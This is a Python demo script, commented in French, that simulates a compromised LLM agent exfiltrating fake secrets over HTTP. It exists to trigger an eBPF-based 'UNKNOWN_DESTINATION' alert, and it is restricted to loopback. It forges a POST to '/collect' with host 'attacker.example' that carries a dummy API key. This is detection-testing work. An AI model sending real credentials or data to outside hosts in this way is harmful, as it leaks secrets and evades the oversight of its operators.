#!/usr/bin/env python3
"""
attack-exfil.py — Exfiltration réseau silencieuse (ADR-019 L4 demo).

Simule un agent LLM compromis qui exfiltre des données via HTTP vers
un serveur inconnu — non présent dans l'allowlist de calibration.

Ce scénario démontre le canal L4 (ADR-019) :
  - Le sinkhole de démo tourne sur 127.0.0.1:9999  → DANS l'allowlist
  - Le "serveur attaquant" tourne sur 127.0.0.1:9876 → HORS allowlist
  → h7-brain émet : UNKNOWN_DESTINATION (confiance 0.70, WARNING immédiat)

Usage :
  python3 attacks/attack-exfil.py
  python3 attacks/attack-exfil.py --count 5 --interval 1.5
  python3 attacks/attack-exfil.py --attacker-port 9876

Garanties :
  - 100 % loopback — aucun trafic ne quitte la machine
  - L'échec de connexion (ECONNREFUSED) est attendu si le serveur
    attaquant n'est pas démarré — la sonde eBPF sys_enter_connect
    se déclenche sur l'appel syscall, pas sur la connexion établie.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time


_BANNER = """
╔══════════════════════════════════════════════════════╗
║  H7 DEMO — EXFILTRATION SILENCIEUSE (ADR-019 L4)    ║
║  Canal : sys_enter_connect → UNKNOWN_DESTINATION     ║
╚══════════════════════════════════════════════════════╝
"""

_FAKE_SECRETS = b'{"api_key":"sk-proj-DEMO","user_data":"<exfiltrated>"}'


def _connect_to_attacker(host: str, port: int, payload: bytes, idx: int) -> str:
    """Tente une connexion TCP vers l'hôte attaquant et envoie la payload.

    sys_enter_connect() est intercepté par h7-sensor quelle que soit
    l'issue de la connexion (connexion refusée ou établie). C'est le
    syscall qui est capturé, pas le succès de l'handshake TCP.
    """
    try:
        with socket.create_connection((host, port), timeout=0.5) as s:
            # Forge une requête HTTP minimale — agent compromis
            http_req = (
                f"POST /collect HTTP/1.1\r\n"
                f"Host: attacker.example\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"User-Agent: langchain-agent/1.0\r\n"
                f"\r\n"
            ).encode() + payload
            s.sendall(http_req)
            return f"[{idx:02d}] ENVOYÉ  → {host}:{port}  ({len(payload)} bytes)"
    except ConnectionRefusedError:
        # Attendu si le serveur attaquant ne tourne pas — la sonde eBPF
        # a quand même capturé sys_enter_connect.
        return f"[{idx:02d}] CONNEXION REFUSÉE (normal si pas de serveur) → {host}:{port}  [syscall capturé]"
    except OSError as e:
        return f"[{idx:02d}] ERREUR {e} → {host}:{port}"


def main() -> int:
    p = argparse.ArgumentParser(description="Démo exfiltration L4 — UNKNOWN_DESTINATION")
    p.add_argument("--attacker-host", default="127.0.0.1")
    p.add_argument("--attacker-port", type=int, default=9876,
                   help="Port hors-allowlist (défaut 9876 ≠ 9999 sinkhole calibré)")
    p.add_argument("--count", type=int, default=3, help="Nombre de tentatives (défaut 3)")
    p.add_argument("--interval", type=float, default=2.0, help="Intervalle en secondes (défaut 2.0)")
    args = p.parse_args()

    if args.attacker_host not in ("127.0.0.1", "::1", "localhost"):
        print(f"[exfil] REFUS: --attacker-host doit être loopback (got {args.attacker_host!r})",
              file=sys.stderr)
        return 2
    if args.attacker_port == 9999:
        print("[exfil] ATTENTION: port 9999 = sinkhole calibré → pas UNKNOWN_DESTINATION !",
              file=sys.stderr)
        return 2

    print(_BANNER)
    print(f"Cible attaquante  : {args.attacker_host}:{args.attacker_port}  (hors allowlist)")
    print(f"Payload simulée   : {_FAKE_SECRETS[:30]}…")
    print(f"Tentatives        : {args.count}  (intervalle {args.interval}s)")
    print()
    print("Signal H7 attendu : UNKNOWN_DESTINATION → épisode WARNING immédiat")
    print("─" * 60)

    for i in range(1, args.count + 1):
        result = _connect_to_attacker(args.attacker_host, args.attacker_port,
                                      _FAKE_SECRETS, i)
        print(result)
        if i < args.count:
            time.sleep(args.interval)

    print()
    print("─" * 60)
    print("Vérification :  make verify-alert   (si sensor actif)")
    print("Logs h7-brain :  grep UNKNOWN_DESTINATION run/logs/h7-brain.log")
    return 0


if __name__ == "__main__":
    sys.exit(main())
